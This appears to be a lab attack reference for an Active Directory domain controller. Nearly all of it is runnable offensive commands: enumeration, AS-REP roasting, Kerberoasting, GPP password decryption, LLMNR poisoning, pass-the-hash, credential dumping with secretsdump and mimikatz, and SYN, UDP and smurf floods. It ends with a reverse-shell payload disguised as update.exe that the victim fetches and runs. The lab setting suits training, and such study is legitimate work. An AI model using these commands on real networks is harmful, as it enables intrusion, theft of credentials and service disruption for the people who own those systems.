# Attack Reference

All attacks run from **KALI-ATK01 (192.168.56.20)** against **DC01 (192.168.56.10)**.

---

## Recon

```bash
# Service discovery — identifies Domain Controller by open ports
nmap -sS -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 192.168.56.10

# UDP scan — finds SNMP
sudo nmap -sU -p 161 192.168.56.10
```

---

## DNS Zone Transfer (T1590.002)

```bash
# Full zone dump
dig axfr corp.lab @192.168.56.10

# Using dnsrecon
dnsrecon -d corp.lab -t axfr -n 192.168.56.10
```

**Expected output:** Full list of A records, SRV records, NS records, SOA record.
Reveals all internal hostnames, IPs, and services without authentication.

---

## LDAP Anonymous Enumeration (T1087.002)

```bash
# All users
ldapsearch -x -H ldap://192.168.56.10 -b "DC=corp,DC=lab" "(objectClass=user)" sAMAccountName description

# All groups and members
ldapsearch -x -H ldap://192.168.56.10 -b "DC=corp,DC=lab" "(objectClass=group)" cn member

# Save username list for downstream attacks
ldapsearch -x -H ldap://192.168.56.10 -b "DC=corp,DC=lab" "(objectClass=user)" sAMAccountName \
    | grep "sAMAccountName:" | awk '{print $2}' | grep -v '^\$$' > /tmp/users.txt
```

---

## SMB Enumeration (T1135)

```bash
# List shares without credentials
smbclient -N -L \\\\192.168.56.10

# Map permissions
smbmap -H 192.168.56.10

# Full enumeration
enum4linux-ng -A 192.168.56.10

# Browse Data share
smbclient -N //192.168.56.10/Data -c "ls"

# Download employee list
smbclient -N //192.168.56.10/Data -c "get employee_list.csv /tmp/emp.csv"

# Find credentials in scripts
smbclient -N //192.168.56.10/IT_Admin -c "get deploy.ps1 /tmp/deploy.ps1"
cat /tmp/deploy.ps1
# Shows: CORP\jane.smith / Summer2024!
```

---

## SNMP Enumeration (T1046)

```bash
# Community string brute force
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.56.10

# System info
snmpwalk -c public -v2c 192.168.56.10 .1.3.6.1.2.1.1

# Running processes
snmpwalk -c public -v2c 192.168.56.10 .1.3.6.1.2.1.25.4.2.1.2

# Installed software
snmpwalk -c public -v2c 192.168.56.10 .1.3.6.1.2.1.25.6.3.1.2
```

---

## AS-REP Roasting (T1558.004)

No credentials required. `john.doe` has `DoesNotRequirePreAuth = True`.

```bash
# Get hash
GetNPUsers.py corp.lab/ -usersfile /tmp/users.txt -dc-ip 192.168.56.10 \
    -format hashcat -outputfile /tmp/asrep.txt

# Crack — Welcome1! is in rockyou.txt
hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `john.doe:Welcome1!`

---

## Kerberoasting (T1558.003)

Requires one valid credential (use `john.doe` from AS-REP crack).

```bash
# Request TGS for all accounts with SPNs
GetUserSPNs.py corp.lab/john.doe:'Welcome1!' -dc-ip 192.168.56.10 \
    -request -outputfile /tmp/kerb.txt

# Crack
hashcat -m 13100 /tmp/kerb.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `svc-mssql:MssqlSvc2024!`

---

## GPP cpassword (T1552.006)

```bash
# Download Groups.xml from SYSVOL
smbclient //192.168.56.10/SYSVOL -U 'CORP\john.doe%Welcome1!' \
    -c "get corp.lab/Policies/{BADCAFE1-0001-0001-0001-BADCAFE10001}/Machine/Preferences/Groups/Groups.xml /tmp/Groups.xml"

# Decrypt
gpp-decrypt $(grep -oP 'cpassword="\K[^"]+' /tmp/Groups.xml)
```

**Result:** `Summer2024!`

---

## BloodHound (T1484.001)

```bash
# Collect all AD data
bloodhound-python -d corp.lab -u john.doe -p 'Welcome1!' \
    -ns 192.168.56.10 -c all --zip

# Start BloodHound
sudo neo4j start
bloodhound &
# Upload the ZIP → search: helpdesk → look for GenericAll edge to ServiceAccounts OU
```

**Finding:** `helpdesk` has GenericAll over `ServiceAccounts` OU — can reset all service account passwords.

---

## LLMNR Poisoning (T1557.001)

```bash
# Start Responder FIRST
sudo responder -I eth0 -rdwv

# Then trigger from DC01 (Win+R):
# Type: \\FILESERVER01 (nonexistent server — triggers LLMNR broadcast)
# Responder captures NTLMv2 hash

# Crack the hash
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.56.10.txt \
    /usr/share/wordlists/rockyou.txt
```

---

## Pass-the-Hash (T1550.002)

```bash
# Test hash
crackmapexec smb 192.168.56.10 -u Administrator -H <NTLM_HASH> --local-auth

# Get WinRM shell
evil-winrm -i 192.168.56.10 -u Administrator -H <NTLM_HASH>

# RDP with hash
xfreerdp /v:192.168.56.10 /u:Administrator /pth:<NTLM_HASH>
```

---

## Credential Dumping (T1003.002)

```bash
# Full domain credential dump
secretsdump.py corp.lab/Administrator:'P@ssw0rd123!'@192.168.56.10

# Using hash (no plaintext needed)
secretsdump.py -hashes :<NTLM_HASH> corp.lab/Administrator@192.168.56.10
```

Inside meterpreter:
```bash
load kiwi
creds_all
lsa_dump_sam
hashdump
```

---

## DoS / DDoS (T1498)

```bash
# SYN flood — SMB port 445 (best Windows target)
sudo hping3 -S -p 445 -c 15000 -d 120 -w 64 --rand-source 192.168.56.10

# SYN flood — RDP port 3389 (visible: RDP becomes slow)
sudo hping3 -S -p 3389 --flood --rand-source 192.168.56.10

# ICMP flood
sudo hping3 --icmp --flood --rand-source 192.168.56.10

# UDP flood — SNMP port 161
sudo hping3 --udp -p 161 --flood --rand-source 192.168.56.10

# Smurf attack (broadcast amplification)
sudo hping3 --icmp -c 5000 --spoof 192.168.56.10 192.168.56.255
```

Monitor on DC01:
```powershell
# Watch SYN_RECEIVED climb during SYN flood
while ($true) {
    $syn = (netstat -an | Select-String "SYN_RECEIVED").Count
    Clear-Host
    Write-Host "SYN_RECEIVED (half-open): $syn" -ForegroundColor Red
    Start-Sleep -Seconds 1
}
```

---

## Post-Exploitation Chain

**Generate payload on Kali:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.56.20 LPORT=4444 -f exe -o /tmp/update.exe
python3 -m http.server 8080
```

**Handler on Kali:**
```bash
msfconsole -q -x "use exploit/multi/handler; \
    set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
    set LHOST 192.168.56.20; set LPORT 4444; run"
```

**On DC01 (as a low-priv user):**
```powershell
Invoke-WebRequest http://192.168.56.20:8080/update.exe -OutFile C:\Temp\update.exe
C:\Temp\update.exe
```

**In meterpreter:**
```
getuid           → who am I
sysinfo          → OS info
shell            → Windows shell
whoami /all      → groups and privileges
net user /domain → domain users
load kiwi        → load mimikatz
creds_all        → dump all creds
hashdump         → local hashes
```
